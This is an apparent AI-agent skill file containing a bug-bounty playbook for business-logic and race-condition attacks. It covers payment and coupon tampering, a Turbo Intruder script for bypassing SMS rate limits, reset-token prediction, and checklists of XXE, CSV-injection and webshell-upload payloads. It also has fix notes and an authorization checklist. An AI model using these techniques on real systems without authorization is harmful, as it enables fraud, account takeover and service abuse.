---
name: logic-race
description: >-
  Business logic and race condition attacks. Covers payment manipulation (decimal quantity/integer overflow/rounding arbitrage), workflow bypass (state machine abuse/multi-device concurrent), race conditions (HTTP/2 single-packet/TOCTOU/advisory lock bypass), and business logic methodology (coupon/inventory/SMS bombing/masked field reconstruction). Load when testing payment flows, one-time operations, or business process integrity.
---

<!-- src: hacker/.claude/skills/logic-race/SKILL.md -->

# Business Logic & Race Conditions

## Internal Navigation
| Part | Content |
|---|---|
| 1 | Business Logic Vulnerabilities |
| 2 | Business Logic Checklist |
| 3 | Business Logic Methodology |
| 4 | Business Logic Scenarios |
| 5 | Race Conditions |

---
# Part 1: Business Logic Vulnerabilities


# SKILL: Business Logic Vulnerabilities — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Business logic flaws are scanner-invisible and high-reward on bug bounty. This skill covers race conditions, price manipulation, workflow bypass, coupon/referral abuse, negative values, and state machine attacks. These require human reasoning, not automation. For specific exploitation techniques (payment precision/overflow, captcha bypass, password reset flaws, user enumeration), load the companion [SCENARIOS.md](./SCENARIOS.md). For the workflow approach itself (modeling → state machine → attack-surface matrix → human judgement) load [METHODOLOGY.md](./METHODOLOGY.md). For the per-module check items load [CHECKLIST.md](./CHECKLIST.md).

### Companion files

| File | When to load |
|---|---|
| [METHODOLOGY.md](./METHODOLOGY.md) | Need the 5-phase workflow, attack-surface 5×N matrix, human-judgement decision tree |
| [CHECKLIST.md](./CHECKLIST.md) | Going through a target module-by-module (login / register / payment / IDOR / privacy) and want every line item with why+verify |
| [SCENARIOS.md](./SCENARIOS.md) | Drilling deeper into payment precision/overflow, captcha bypass, password reset, enumeration, frontend bypass |

### Extended Scenarios

Also load [SCENARIOS.md](./SCENARIOS.md) when you need:
- Payment precision & integer overflow attacks — 32-bit overflow to negative, decimal rounding exploitation, negative shipping fees
- Payment parameter tampering checklist — price, discount, currency, gateway, return_url fields
- Condition race practical patterns — parallel coupon application, gift card double-spend with Burp group send
- Captcha bypass techniques — drop verification request, remove parameter, clear cookies to reset counter, OCR with tesseract
- Arbitrary password reset — predictable tokens (`md5(username)`), session replacement attack, registration overwrite
- User information enumeration — login error message difference, masked data reconstruction across endpoints, base64 uid cookie manipulation
- Frontend restriction bypass — array parameters for multiple coupons (`couponid[0]`/`couponid[1]`), remove `disabled`/`readonly` attributes
- Application-layer DoS patterns — regex backtracking, WebSocket abuse


## 1. PRICE AND VALUE MANIPULATION

### Negative Quantity / Price
Many applications validate "amount > 0" but not for currency:
```
Add to cart with quantity: -1
Update quantity to: -100
{
  "quantity": -5,
  "price": -99.99     ← may be accepted
}
```
**Impact**: Receive credit to account, items for free, bank transfers in reverse.

### Decimal Quantity — "0元购" Case
Real instructor-led case: an e-commerce app accepted **fractional `quantity`** because backend trusted client float values:
```json
// Cart item:
{"id": 114016, "skuQty": 0.02}
// Original price ¥500 → final price ¥10
// Variant on a food delivery app:
// FoodNum=0.01 → 68元 商品 实付 0.68元
```
Why it works: server multiplies `unit_price * quantity` without enforcing `quantity ∈ Z+`, so a 2% sliver order pays 2% price but ships the full item. Reproduce by intercepting the cart submit → setting `skuQty` / `FoodNum` to `0.02` → finishing checkout.

### Drop a Required Field — Free Tier Coercion
Sport activity registration: when paid prizes are involved server returns `"payType": "paid"`; if the client request is **edited to omit `prizeIdList` entirely**, the server falls back to `"payType": "free"` and creates a successful registration that should have cost money.
```json
// Original
{"prizeIdList": ["6264e6948fe587000113e2d9"], ...}
// Modified — array removed entirely
{"prizeIdList": [], ...}
// Server response:
{"ok": true, "payType": "free"}
```
This is a parameter-existence trust bug — backend treats "field absent" as "no paid item to enforce", so fix is to require the field and validate its content server-side.

### Integer Overflow
```
quantity: 2147483648   ← INT_MAX + 1 overflows to negative in 32-bit
price: 9999999999999   ← exceeds float precision → rounds to 0
```
Real case: setting `amount=999999999` triggered an overflow path where the system stored `0` as final payable. **Always coordinate before triggering overflow tests** — they sometimes crash payment services.

### Rounding Manipulation
```
Item price: $0.001
Order 1000 items → each rounds down → total = $0.00
```
Real "half-price recharge" bug: input `¥0.019` to top-up. The pay gateway charges only `¥0.01` (rounded down to the cent), but the wallet credits `¥0.02` (rounded up). Net gain per cycle is `¥0.01`, repeat for free balance growth.

### Currency Exchange Rate Lag
```
1. Deposit using currency A at rate X
2. Rate changes
3. Withdraw using currency A at new rate → profit from rate difference
```

### Free Upgrade via Promo Stacking
Test combining discount codes, referral credits, welcome bonuses:
```
Apply promo: FREE50  → 50% off
Apply promo: REFER10 → additional 10%
Apply loyalty points → additional discount
Total: -$5 (free + credit)
```

---

## 2. RACE CONDITIONS

**Concept**: Two operations run simultaneously before the first completes its check-update cycle.

### Double-Spend / Double-Redeem
```bash
# Send same request simultaneously (~millisecond apart):
# Use Burp Repeater "Send to Group" or Race Conditions tool:

POST /api/use-coupon    ← send 20 parallel requests
POST /api/redeem-gift   ← same coupon code, parallel
POST /api/withdraw-funds ← same balance, parallel

# If check and update are non-atomic:
# Thread 1: check(balance >= 100) → TRUE
# Thread 2: check(balance >= 100) → TRUE (before Thread 1 deducted)
# Thread 1: balance -= 100
# Thread 2: balance -= 100 → BOTH succeed → double-spend
```

### Race Condition Test with Burp Suite
```
1. Capture request
2. Send to Repeater → duplicate 20+ times
3. "Send group in parallel" (Burp 2023+)
4. Check: did any duplicate succeed?
```

### Turbo Intruder — Bypassing Per-Number SMS Rate Limit
Real case: when a normal request returns `"该号码短时间内申请发送短信次数过多，拒绝发送"`, sending the **same payload** with high concurrency through Turbo Intruder defeats the simple counter:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=10,
                           pipeline=False)
    for i in range(30):
        engine.queue(target.req, target.baseInput, gate='race1')
    engine.openGate('race1')
```
Result: the per-phone limiter races and many requests slip through, generating multiple distinct verification codes (a real SMS-bombing case). Root cause: counter increment is non-atomic vs. the read.

### Multi-Device Concurrent VIP Subscription
Real case: a service offers **first-month-only discount**. Open the pay sheet on multiple devices (A, B, C) before any payment finishes, then complete each in sequence. Server only checks "is new user?" at the **first** request, so all subsequent requests inherit the discount AND the VIP duration stacks.
```
Normal: 下单 → 支付 → 充值会员 → 第二次下单 → 服务端校验 "已是新人" → 拒绝
Bypass: 设备A: 进入支付页 (锁定优惠资格)
        设备B: 进入支付页 (并发锁定)
        设备A: 完成支付 → VIP +1月 (优惠价)
        设备B: 完成支付 → VIP +1月 (仍按优惠价)
```
Same trick works on "补差价升级会员" — concurrent top-ups duplicate the duration credit.

### Account Registration Race
```
Register with same email simultaneously → two accounts created → data isolation broken
Password reset token race → reuse same token twice
Email verification race → verify multiple email addresses
```

### Limit Bypass via Race
```
"Claim once" discounts, freebies, "first order" bonus:
→ Send 10 parallel POST /claim requests
→ Race window: all pass the "already claimed?" check before any write
```

---

## 3. WORKFLOW / STEP SKIP BYPASS

### Payment Flow Bypass
```
Normal flow:
  1. Add to cart
  2. Enter shipping info
  3. Enter payment (card/wallet)
  4. Click confirm → payment charged
  5. Order confirmed

Attack: Skip to step 5 directly
POST /api/orders/confirm {"cart_id": "1234", "payment_status": "paid"}
→ Does server trust client-sent payment_status?
```

### Multi-Step Verification Skip
```
Password reset flow:
  1. Enter email
  2. Receive token
  3. Enter token
  4. Set new password (requires valid token from step 3)

Attack: Try going to step 4 without completing step 3:
POST /reset/password {"email": "victim@x.com", "token": "invalid", "new_pass": "hacked"}
→ Does server check that token was properly validated?

Or: Try token from old/expired flow → still accepted?
```

### 2FA Bypass
```
Normal flow:
  1. Enter username + password → success
  2. Enter 2FA code → logged in

Attack: After step 1 success, go directly to /dashboard
→ Is session created before 2FA completes?
→ Does /dashboard require 2FA-complete check or just "authenticated" flag?
```

### Filter Path Truncation Bypass — `..//` and `;`

Real case from a Java Web class audit: a manually-implemented Servlet `Filter` checks login by inspecting the URI string. Two reliable bypasses:

```
Path-traversal truncation (../):
  Protected:   http://target/FilterDemo/index.jsp        → 302 to /login
  Bypass:      http://target/FilterDemo/../../index.jsp  → 200 (filter sees "../../", URL parser collapses)

Semicolon truncation (;):
  Protected:   http://target/admin/doLogin.action        → 302 to /login
  Bypass:      http://target/;/admin/doLogin.action      → 200
                              ^
                              Servlet container treats segment after ; as "path parameter",
                              filter that uses request.getRequestURI() sees "/;/admin/doLogin.action",
                              doesn't match its protected-prefix "/admin/", lets the request through,
                              but the dispatcher then routes to the real /admin/doLogin.action handler.
```

**Fix**: never use `request.getRequestURI()` for security checks; use `request.getServletPath()` which is the normalized servlet-mapped path:
```java
// Vulnerable
String uri = request.getRequestURI();   // /;/admin/doLogin.action
// Safe
String path = request.getServletPath(); // /admin/doLogin.action
```

When auditing Java code, grep for `request.getRequestURI()` paired with `Filter`/`startsWith`/`indexOf("/admin")` patterns — those are immediate red flags.

### Real-Name Verification Replay-To-Reset

Fraudulent path that deliberately fails real-name authentication to **reopen** the editing flow:
```
1. Submit real-name auth with intentionally wrong cardNumber
   → server returns "code:200, msg:success, ok:true" but flow shows "驳回 / 等待审核"
2. Because the server marks state as "rejected" but doesn't lock the user, the UI lets the
   account go back into the "edit identity" state
3. Now resubmit with another (possibly stolen) identity
   → real-name binding repeats indefinitely, defeating anti-addiction lock and enabling account resale
```
Defense: rejected real-name submissions must lock the account / require human review, not loop back to the editor.

### Shipping Without Payment
```
  1. Add item to cart
  2. Enter shipping address
  3. Select payment method (credit card)
  4. Apply promo code (100% discount or gift card)  
  5. Final amount: $0
  6. Order placed

Attack: Apply 100% discount code → no actual payment processed → item ships
```

---

## 4. COUPON AND REFERRAL ABUSE

### Coupon Stacking
```
Test: Can you apply multiple coupon codes?
Test: Does "SAVE20" + promo stack to >100%?
Test: Apply coupon, remove item, keep discount applied, add different item
```

### Referral Loop
```
1. Create Account_A
2. Register Account_B with Account_A's referral code → both get credit
3. Create Account_C with Account_B's referral code
4. Ad infinitum with throwaway emails
→ Infinite credit generation
```

### Coupon = Fixed Dollar Amount on Variable-Price Item
```
Coupon: -$5 off any order
Buy item worth $3, use -$5 coupon → net -$2 (credit balance)
```

---

## 5. ACCOUNT / PRIVILEGE LOGIC FLAWS

### Email Verification Bypass
```
1. Register with email A (legitimate, verified)
2. Change email to B (attacker's email, unverified)
3. Use account as verified — does server enforce re-verification?

Or: Change email to victim's email → no verification → account claim
```

### Password Reset Token Binding
```
1. Request password reset for your account → get token
2. Change your email address (account settings)
3. Reuse old password reset token → does it still work for old email?

Or: Request reset for victim@target.com
    Token sent to victim but check: does URL reveal predictable token pattern?
```

### OAuth Account Linking Abuse
```
1. Have victim's email (but not their password)
2. Register with victim's email → get account with same email
3. Link OAuth (Google/GitHub) to your account
4. Victim logs in with Google → server finds email match → merges with YOUR account
```

### Cookie Replacement — Horizontal/Vertical Privilege Escalation

The textbook IDOR demo from the audit videos:
```
1. Login as super-admin → capture request, copy Cookie (JSESSIONID/Token)
2. Logout, login as plain user → capture another request to the SAME endpoint
3. Replay the plain-user request, but swap the Cookie value with the admin's token
4. If the response returns admin-only data → vertical escalation
   If it returns another-user's data → horizontal escalation
```
A common companion bug: `/oa/emp/list` returns **HTTP 302 to /login when no cookie**, but **200 with full data when any plain-user cookie is sent** — meaning the only check is "logged in?", not "authorized for this endpoint".

### Permission Residue from Database Inconsistency

A subtle case from the second audit class: the admin UI shows that role X has had permission `user:list` revoked, but querying the SQL data:

```sql
SELECT * FROM sys_menu WHERE role_id = 2;
-- two rows for the same menu_id "user:list"
```

The UI's "remove permission" only deleted ONE row; the duplicate row keeps the API accessible. Verify by:
```sql
SELECT menu_id, COUNT(*) FROM sys_menu GROUP BY menu_id, role_id HAVING COUNT(*) > 1;
```

Lesson: when a UI says permission revoked but API still works → check the underlying RBAC table for duplicates / orphaned grants.

### Weak-Random Password Reset Token

PHP / legacy stack on Windows uses `rand()` whose `RAND_MAX = 32768`. If a reset link uses
`/resetpassword.php?id=md5(rand())`, the entire keyspace is precomputable:
```php
$a = 0;
for ($a = 0; $a <= 32768; $a++) {
    $b = md5($a);
    echo $b . "\r\n";
}
```
Iterate the resulting dictionary against `/resetpassword.php?id=<hash>` — when one returns a valid reset page you can change the victim's password. Audit any token generation that ultimately calls `rand()`, `mt_rand()` (without seeding), `Random()` (default seed in C#), etc.

---

## 6. API BUSINESS LOGIC FLAWS

### Object State Manipulation
```
order.status = "pending"
→ PUT /api/orders/1234 {"status": "refunded"}   ← self-trigger refund
→ PUT /api/orders/1234 {"status": "shipped"}    ← mark as shipped without shipping
```

### Transaction Reuse
```
1. Initiate payment → get transaction_id
2. Complete purchase
3. Reuse same transaction_id for second purchase:
   POST /api/checkout {"transaction_id": "USED_TX", "cart": "new_cart"}
```

### Limit Count Manipulation
```
Daily transfer limit = $1000
→ Transfer $999, cancel, transfer $999 (limit not updated on cancel)
→ Parallel transfers (race condition on limit check)
→ Different payment types not sharing limit counter
```

### Java Web "No Filter, No Spring Security" Anti-Pattern

Audit-friendly tell: a Spring Boot project that does **NOT** include `spring-boot-starter-security` and has zero `Filter` classes. This means every controller is wide-open for `guest` unless the developer manually checked the session in each method. Reproduce:
```bash
# Inside the source tree
find . -name "*.java" -exec grep -l "Filter" {} \;     # likely empty
find . -name "*.java" -exec grep -l "@PreAuthorize\|@Secured" {} \;
```
If both are empty, expect almost every API to be unauthorized. From the audit demo:
```java
public Result score(@RequestParam("userId") Integer userId) {
    Score score = scoreService.selectScoreByUserId(userId);
    return Result.success(score);
}
```
No check that `userId` matches the session's logged-in user → horizontal IDOR. Worse: the same endpoint works **without any Cookie**, since nothing forces authentication globally.

### Spring Security `antMatchers` Coverage Gap

The audit videos also showed a partially-secured Spring Security config like:
```java
.antMatchers("/system/user/info").authenticated()
.antMatchers("/system/menu/**").hasRole("admin")
```
A common error is an over-narrow rule — e.g. `/system/user/info` is protected but `/system/user/list` is not, or `/system/menu/**` is admin-only but `/system/dept/treeData` is open. Cross-check the controller annotations (`@PreAuthorize("@ss.hasPermi('system:user:list')")`) against the SecurityConfig — every annotated endpoint must also map to a SecurityConfig rule. Mismatches are common after refactors.

---

## 7. SUBSCRIPTION / TIER CONFUSION

```
Free tier: cannot access feature X
Paid tier: can access feature X

Attack: 
- Sign up for paid trial → enable feature X → downgrade to free
  → Does feature X get disabled on downgrade? 
  → Can you continue using feature X?

Or:
- Inspect premium endpoint list from JS bundle
- Directly call premium endpoints with free account token
→ Server checks subscription for UI but not API?
```

### Direct Media URL Leak — VIP Resource Bypass

Real cases from a fitness/learning app: when the client requests course detail, the JSON response embeds the raw media URL:
```http
GET /gerudo/v2/liveCourse/625020ce8f002700010554c1/detail HTTP/1.1
{
  "previewPullUrl": "http://app-live.../live/app-live_625020ce8f002700010554c2_Preview.flv"
  ...
}
```
Search **all** detail / preview / playback responses for keywords:
```
.flv  .m3u8  .mp4  .mp3  videoUrl  downloadUrl  streamUrl  previewPullUrl
```
For each hit, replay the URL anonymously (curl, VLC, flv.js demo at `https://bilibili.github.io/flv.js/demo/`). If the URL plays without a session, you've broken VIP gating. Defense: use signed, short-TTL URLs bound to user/IP/Referer, not raw resource paths.

### Resource ID Replacement — Free → Paid Course

Companion bug: free course detail returns `{"id": "60caa21e853f5c1651b27c1b", ...}`. Replace the ID in the URL with a known paid course ID. If the response structure remains the same and includes the playable URL → IDOR on premium content. Defense: verify the **owner relation** on each detail call, not just "is logged-in".

---

## 8. FILE UPLOAD BUSINESS LOGIC

For the full upload attack workflow beyond pure logic flaws, also load:

- [upload insecure files](../upload-insecure-files/SKILL.md)

```
Upload size limit: 10MB
→ Upload 10MB → compress client-side → server decompresses → bomb?
(Zip bomb: 1KB zip → 1GB file = denial of service)

Upload type restriction:
→ Upload .csv for "data import" → inject formulas: =SYSTEM("calc")
  (CSV injection in Excel macro context)
→ Upload avatar → server converts → attack converter (ImageMagick, FFmpeg CVEs)

Storage path prediction:
→ /uploads/USER_ID/filename
→ Can you overwrite other user's file by knowing their ID + filename?
```

---

## 9. TESTING APPROACH

```
For each business process:
1. Map the INTENDED flow (happy path)
2. Ask: "What if I skip step N?"
3. Ask: "What if I send negative/zero/MAX values?"
4. Ask: "What if I repeat this step twice?" (idempotency)
5. Ask: "What happens if I do A then B instead of B then A?"
6. Ask: "What if two users do this simultaneously?"
7. Ask: "Can I modify the 'trusted' status fields?"
8. Think from financial/resource impact angle → highest bounty
```

For the formal 5-phase workflow — Business Modeling → State Machine → Attack-Surface Matrix → Checklist-Driven Testing → Human Judgement — load **[METHODOLOGY.md](./METHODOLOGY.md)**. It includes a single-page decision tree (`Q1 ~ Q7`) for "I'm staring at a request and don't know what to try first".

---

## 10. HIGH-IMPACT CHECKLISTS

For the full per-module list (login / register / password recovery / payment / coupon / order / IDOR / privacy / VIP / URL redirect / cookie & token / race / comments) with `why` and `verify` columns — load **[CHECKLIST.md](./CHECKLIST.md)**.

The condensed top-impact items below are the "if you have only 30 minutes, hit these first" set:

### E-commerce / Payment
```
□ Negative quantity / decimal quantity (skuQty=0.02, FoodNum=0.01) in cart
□ Drop required fields (delete prizeIdList) to coerce free tier
□ amount=999999999 integer overflow → final 0
□ Apply multiple conflicting coupons via array params
□ Race condition: double-spend gift card / same coupon
□ Skip payment step directly to order confirmation  
□ Server-trusted client status fields (payment_status=paid, success:true)
□ Refund without return (trigger refund on delivered item via state change)
□ Multi-device concurrent VIP subscription / 补差价升级
□ Currency rounding exploitation (¥0.019 charge → ¥0.02 wallet credit)
```

### Authentication / Account
```
□ 2FA bypass by direct URL access after password step
□ Filter bypass: ../../path traversal truncation, ;path-parameter truncation
□ Password reset token reuse after email change
□ Weak random reset token: md5(rand()) on Windows PHP, predictable seed
□ Email verification bypass (change email after verification)
□ OAuth account takeover via email match
□ Register with existing unverified email
□ Cookie replacement (admin → user / user → another user)
□ Real-name verification "故意填错" replay-to-reset
```

### Subscriptions / Limits / Resources
```
□ Access premium features after downgrade
□ Exceed rate/usage limits via parallel requests (Turbo Intruder)
□ Referral loop for infinite credits
□ Free trial ≠ time-limited (no enforcement after trial)
□ Direct API call to premium endpoint without subscription check
□ Free-course ID swap to paid-course ID (IDOR on resource)
□ Direct media URL exposure in JSON (.flv / .m3u8 / .mp4 in response)
□ Server-side RBAC residue (sys_menu duplicate rows)
□ Java Web no-Filter / Spring Security antMatchers gap
```

---

## 11. CONSOLIDATED CHECKLIST (2-Hour Full Sweep)

The Section 10 list is the "30-minute money grab". This list is the next layer:
when you have a couple of hours and want a defensive-grade sweep across all
nine business surfaces. It's organized by surface, then by attack mechanism
inside the surface, so you can read a column-down for "what classes of bug
might exist on this endpoint" and a row-across for "where else does this
attack apply".

For full `item / why / verify` triplets including reproduction steps and
tooling per item, load **[CHECKLIST.md](./CHECKLIST.md)**. This section
keeps only the item line for fast scanning.

### 11.1 Login / Authentication
```
□ Username enumeration via response diff (msg / status code / timing)
□ Username enumeration via SMS-send response (sent vs not-registered)
□ Brute force without lockout (no rate limit on failed login)
□ Default / weak credentials (admin/admin, root/123456) on backend & infra
□ 2FA bypass via direct URL after password step / replay 2FA token
□ Client-trusted login flag (status=success, is_login=true in response body)
□ Third-party / SSO callback IDOR (modify uid in callback to take over)
□ Biometric liveness bypass (replay static photo / pre-recorded video)
□ Open redirect in login/register (return_url, redirect, callback param)
□ Hardware-key signature replay / forgery (USB-Key, PKI cert)
```

### 11.2 Registration
```
□ Username / phone / email enumeration via "already exists" response
□ Password strength only enforced client-side (set 123456 server-side)
□ Skip multi-step registration (POST final step directly, miss email verify)
□ Verification code not enforced (empty / random / fixed value passes)
□ SMS / email code replay (same code used twice or across users)
□ Re-register same username after logout, inherit old data / privileges
□ Anti-fraud bypass via N similar virtual accounts (same device, diff email)
□ Mass-register replay-protection missing (no nonce on submit step)
```

### 11.3 Password Recovery / Reset
```
□ Reset target tampering (uid / email / phone in submit step)
□ Reset token predictable (timestamp-derived, weak hash, short random)
□ Cross-user token reuse (A's reset_token, change B's password)
□ Old-password check missing on logged-in change-password endpoint
□ Skip code-verify step, hit final reset endpoint directly
□ Reset link / answer / token leaked in HTML or JS source
□ Reset token has no expiry / not invalidated after use
□ Reset code base64-only "obfuscated" in response
□ Inconsistent identity across multi-step flow (reset_token from step 2
  reusable in step 4)
□ Old session not revoked after email/phone re-bind
```

### 11.4 Session / Token
```
□ Session fixation: pre-login session id remains valid after login
□ Token not bound to user/IP/device (steal cookie → use anywhere)
□ Forged token: weak algorithm md5(username + timestamp), no server salt
□ Stale token still accepted after logout / expiry (no blacklist)
□ Cookie tampering (uid / role / is_admin in cookie trusted server-side)
□ State-machine replay (replay "claim red packet" → re-claim)
□ Anti-replay missing on one-time tokens (CSRF token, OTP, nonce)
□ Sensitive credentials (token, answer, key) hardcoded in front-end JS
□ Privileged session created from public Session ID without re-auth
□ Token works cross-environment (different IP, different UA, no validation)
```

### 11.5 Payment / Order
```
□ Amount tampering: amount = 0.01 / 0 / negative / 0.001
□ Quantity tampering: quantity = -1 / 0.01 / 1.5 / 999999999
□ Integer overflow: quantity * price wraps to 0 or negative
□ Floating-point precision exploit (multi-decimal, accumulated rounding)
□ Currency code swap (CNY → JPY/RUB at same numeric value)
□ Coupon / discount field forge (coupon_id, discount=, free_shipping=true)
□ Item ID swap: replace product_id with cheaper SKU at checkout
□ Signature / sign-field bypass (drop sign param, use stale sign)
□ Payment-callback forgery (status=paid posted to internal callback)
□ Replay paid request → multiple shipments / multiple credit
□ Race / concurrency: oversell, double-spend gift card, double redeem coupon
□ Refund without losing the merchandise / virtual rights
□ VIP duration tampering (days=999, months=120, period=-1)
□ Receiver-account redirect (merchant_id / receiver_account swap on withdraw)
□ Negative shipping / fee fields decreasing total (shipping_fee = -500)
□ Concurrent topup-then-refund draining (refund > topup in race window)
□ Pricing rule transition window (price changes at T, replay at T-ε with old rule)
□ Currency rounding micro-arbitrage (charge 0.019 → wallet credit 0.02)
□ Multi-channel inconsistency (online vs cash-on-delivery vs balance pay)
```

### 11.6 IDOR / Authorization
```
□ Horizontal IDOR: uid / order_id / resource_id swap to victim's
□ Vertical IDOR: role / type / level field set to admin in request
□ Hidden field tampering (data-user-id in HTML / JS state)
□ Email / phone re-bind without verifying old binding
□ UID vs session-token consistency missing (token belongs to A, uid sent as B)
□ Predictable / sequential resource IDs (gift IDs, share-link IDs)
□ Resource enumeration on order / coupon / share / trip-detail endpoint
□ Multi-entry inconsistency: web blocks, mobile API doesn't
□ State-machine illegal transition (claim reward without paying / shipping
  before order paid)
□ Hidden / undocumented admin endpoint accessible without admin auth
□ Cross-role function call (user calls merchant API, rider API, etc.)
□ Privilege via concurrent action (request role-elevation race condition)
```

### 11.7 CAPTCHA / Verification Code
```
□ Code returned in plaintext in HTTP response (body / header / JS var)
□ Receiver tampering: change phone / email param to attacker-controlled
□ Empty / fixed code accepted (000000, blank, "test")
□ Drop the code field entirely → request still succeeds
□ Cross-account reuse (A's valid code accepted on B's flow)
□ One-time enforcement missing (same code reusable until expiry)
□ Brute force 4-6 digit code (no attempt limit, no lockout)
□ SMS / email bombing (no rate limit per IP / per phone / no graphical CAPTCHA)
□ Front-end-only "send-success" status (server says fail, FE says success)
□ Code not bound to session (code generated for A, used in B's session)
```

### 11.8 File Upload
```
□ Content-Type bypass (Content-Type: image/jpeg, body is PHP)
□ Extension trick: double ext (.php.jpg), case mix (.Php), null byte, ;path
□ Filename path traversal (filename=../../webshell.php)
□ File-content polyglot (image with embedded PHP / shell)
□ Office XML repack (unzip docx → inject XML → rezip → upload)
□ XXE via .xml / .dtd upload endpoint
□ Backend-only upload (admin login → upload → exec)
□ Upload race: upload + parallel access before AV scan / cleanup
□ ZIP bomb (1KB → 1GB on server, decompress DoS)
□ CSV formula injection (=SYSTEM("calc"), =cmd|'/c calc'!A1)
□ Storage path predictable / overwritable across users (/uploads/UID/file)
□ Image converter / parser CVE (ImageMagick, FFmpeg, pillow)
```

### 11.9 CSRF / SSRF / XXE
```
□ XXE file read (<!ENTITY x SYSTEM "file:///etc/passwd">)
□ XXE blind via OOB (parameter entity → DNSLog / Burp Collaborator)
□ SSRF via image-import / webhook / preview URL (file://, http://127.0.0.1)
□ SSRF via FTP / gopher / jar / php-wrapper / dict protocols
□ XML parser dangerous wrappers enabled (php://expect, expect://)
□ Out-of-band detection for blind injection (DNSLog confirms server hit)
□ CSRF on state-changing endpoint (no token, no SameSite, no origin check)
□ Payment / withdrawal CSRF via auto-submitting hidden form
□ Login CSRF (force victim to log into attacker account)
□ JSONP / JSONP-callback exploitation as CSRF read primitive
```

### How to Use This Section

1. Print or screenshot the relevant 1-2 sub-sections for the target's surface.
2. For each `□` mark: NOT-APPLICABLE / NOT-VULN / VULN / NEEDS-RECHECK.
3. Mark the EXACT endpoint + parameter + payload that proved the bug
   (or proved it absent), so the report is reproducible.
4. Cross-reference with `METHODOLOGY.md` Q1~Q7 decision tree when an item
   triggers something unexpected — the tree tells you which neighboring
   items are likely also vulnerable.
5. For deep payloads / curl-ready commands / Burp screenshots per item,
   load `CHECKLIST.md` (full triplets) and `SCENARIOS.md` (real cases).



---
# Part 2: Business Logic Checklist


## 0. Compliance / 合规前置（每个项目第一条 checklist）

| Item | why | verify |
|---|---|---|
| 已获得书面授权且授权范围、时间窗口、数据可触及类型清晰 | 网安法第 22 条 / 刑法 285 条要求一切测试在授权范围内 | 检查授权书；目标系统清单；数据采集日志保存路径 |
| 测试工具非"专为入侵或非法控制设计" | 刑法 285 条修正案禁止提供专门入侵工具 | 工具来源（github / vendor）、用途说明、是否被列为恶意软件 |
| 测试中不接触/不存储/不传输任何真实公民个人信息 | 网安法第 38 条严禁非法获取或提供个人信息 | 实名/身份证类测试**只能用授权方提供的测试身份**；导出文件需脱敏 |
| 触发整数溢出 / 资源耗尽 / 大并发类漏洞前已二次确认 | 容易导致服务停摆，可能升级为破坏计算机信息系统罪 | 二次书面确认 + 留出业务低峰期窗口 |

参考：8.逻辑漏洞.pdf page_00001 / page_00002。


## 1. Login / 登录模块

| Item | why | verify |
|---|---|---|
| 登录接口对连续失败有限频或封禁 | 否则可枚举/撞库 | 用 Burp Intruder 连续提交 5~10 次错误密码，看是否触发图形验证码、IP 封禁、账户锁定 |
| 验证码有时效（≤ 5 min）且一次性 | 否则可暴力破解或重放 | 取得验证码后等待超时再提交；或同一验证码连续提交多次看是否仍被接受 |
| 验证码不可在响应中明文回传 | 8.逻辑漏洞.pdf page_00020 案例：JSON `{"randm":9759,"code":0}` 直接给出 | 抓包搜索响应体里是否含 `code`/`randm`/`captcha` 等字段值与短信内容一致 |
| 不允许"万能验证码" | 开发遗留的 `000000`/`123456` 容易被利用 | 用常见万能码尝试登录或重置流程 |
| 登录后 Session ID 必须重新签发 | 否则可能 session fixation | 登录前后对比 Cookie，看 SESSIONID 是否变化 |
| Cookie / Token 有 `HttpOnly`、`Secure` 标志且无可预测序列 | 弱 token 可枚举或伪造 | DevTools 查 Cookie 属性；分析 token 结构是否含明文 uid / role |
| 不允许空密码或被绕过的"短路"登录 | 校验缺失会任意登录 | 提交 `password=` 空值；提交 `username=admin'/*` 等 |
| 错误提示对"用户存在 / 不存在"统一模糊回复 | 否则可枚举用户 | 输入已知用户与随机用户，对比响应文案、状态码、耗时 |
| 第三方/SSO 登录回调严格校验授权码与用户 ID 绑定 | 回调接口仅信任传入 user_id 参数即接管 | 在第三方登录回调请求中将 `uid`/`openid` 参数改为受害者 ID，看是否登录至受害者账户 |
| 登录响应中的 `status`/`is_login`/`code` 状态位不可被前端改写后冒认登录态 | 后端未真正建立会话，前端依赖响应字段判断 | 拦截响应，把 `success:false` 改为 `true`、`is_login:0` 改为 `1`，看是否进入受保护页 |
| 生物识别接口必须含活体检测，不接受静态图片/预录视频 | 仅校验特征值未校验活体属性，可媒体替换 | 用合法用户的静态人脸照片/录屏文件替代摄像头流提交，看是否判定为活体 |
| 硬件密钥/USB-Key 签名带时效与一次性 nonce | 否则旧签名可重放，伪造密钥可重用 | 拦截一次合法签名请求，重放旧签名或修改 device-id 字段，看服务端是否拒绝 |
| 登录/注册的 `return_url`/`redirect`/`callback` 走域名白名单 | 否则任意外站钓鱼 | 改 `return_url=https://evil.com` 看响应 Location 是否指向外部 |

参考：逻辑漏洞checklist.pdf page_00003、8.逻辑漏洞.pdf page_00019/00020。

---

## 2. Registration / 注册模块

| Item | why | verify |
|---|---|---|
| 后端独立校验图形验证码 / 短信验证码，前端校验只是 UX | 跳过前端就相当于跳过验证 | Burp 拦截注册请求，删除 `verifycode` 参数后 replay |
| 短信验证码与手机号强绑定 | 不绑定可发到 A 用 B 的码注册 | 抓包改 `mobile=A` 但 `code=B 的码` 看能否成功 |
| 一个邮箱/手机号不能重复注册 | 缺乏唯一性会导致养号、撞库 | 用相同邮箱 + 不同 username 多次注册；并发同邮箱注册 |
| 注册接口防爆破（频率 + 图形验证 + 设备指纹） | 用于批量小号 | 用脚本每秒提交不同 username，看是否成功 |
| 验证码 / 注册 token 不在响应里回传 | 回传可绕过验证 | 抓包看响应里是否直接返回 `randm`/`activation_token` |
| 公众号 / 小程序 / 内部接口同样有验证码 | "只有公众号才管的入口"是高风险点 | 试访问 H5 页未暴露但 App 内有的接口（逻辑漏洞checklist.pdf page_00004） |
| 用户名/昵称字段做 XSS 过滤 | 注册时插 XSS 是经典存储型 | 注册时填 `<script>alert(1)</script>`，登录后查个人主页 |
| 不允许 token / timestamp 重放绕过防重 | 否则可批量重复注册 | 同一注册请求改时间戳后 replay |
| 注销账号后立即用相同用户名/邮箱重新注册不应继承旧权益、订单、余额、VIP | 注销流程未彻底清除关联数据/会话 | 注销账号 → 立即用同账号重新注册并登录，检查订单 / 余额 / VIP 状态 |
